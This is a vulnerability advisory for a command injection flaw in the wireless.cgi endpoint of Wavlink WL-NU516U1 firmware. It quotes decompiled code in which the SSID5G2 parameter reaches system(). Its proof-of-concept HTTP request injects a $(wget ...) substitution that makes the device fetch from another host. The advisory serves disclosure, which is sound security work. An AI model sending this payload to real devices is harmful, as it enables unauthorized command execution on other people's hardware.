# WL-NU516U1 wireless.cgi multi_ssid SSID5G2 Command Injection

Vendor: Wavlink

Product: WL-NU516U1

Version: M16U1_V240425
Firmware Download: https://docs.wavlink.xyz/Firmware/?category=USB+Printer+Server&model=WL-NU516U1-A

Vulnerability: Command Injection

CVE: TBD

## Affected version

Wavlink WL-NU516U1 M16U1_V240425

## Vulnerability details

Wavlink WL-NU516U1 M16U1_V240425 contains a command injection vulnerability in /cgi-bin/wireless.cgi.

When the `page` parameter is set to `multi_ssid`, the function `sub_401D68` is invoked.

The `SSID5G2` parameter flows into `set_bss.sh` commands via sprintf:

```c
sprintf(v29, "set_bss.sh set 6 \"%s\" \"%s\" \"%s\" Admin12345 %s", v38, v14, v18, v36);
system(v29);
```

Where `v38` = SSID5G2 (user-controlled).

## Proof of Concept (PoC)

```http
POST /cgi-bin/wireless.cgi HTTP/1.1
Host: 192.168.6.3
Content-Type: application/x-www-form-urlencoded
Referer: http://192.168.6.3/
Connection: close
Content-Length: 106

page=multi_ssid&wifi_multi_ssid=1&SSID5G2=$(wget http://192.168.6.1:6666/ssid5g2)&AuthMethod2=OPEN&EncrypType2=NONE
```
